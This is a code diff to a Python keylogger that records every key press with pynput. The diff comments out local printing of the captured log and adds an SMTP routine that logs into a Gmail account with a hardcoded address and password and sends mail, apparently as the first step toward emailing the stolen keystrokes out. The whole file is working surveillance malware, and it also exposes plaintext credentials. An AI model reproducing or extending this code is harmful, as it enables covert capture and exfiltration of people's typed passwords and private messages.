@@ -1,4 +1,5 @@
 import pynput.keyboard
+import smtplib
 
 # creating a listener object and a call back function
 
@@ -16,7 +17,20 @@ def callback_function(key):
             log = log + " "
         else:
             log = log + str(key)
-    print(log)
+    # print(log)
+
+
+# creating smtp instance to connect to the gmail
+def send_mail():
+    email_server = smtplib.SMTP("smtp.gmail.com", 587)
+    email_server.starttls()
+    email_server.login("ndunguaus@gmail.com", "aq9agm11")
+    email_server.sendmail("ndunguaus@gmail.com", "ndunguaus@gmail.com", "Test")
+    email_server.quit()
+
+
+send_mail()
+# 587 is the port for gmail, smtp.gmail.com is the address of our email address
 
 
 keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
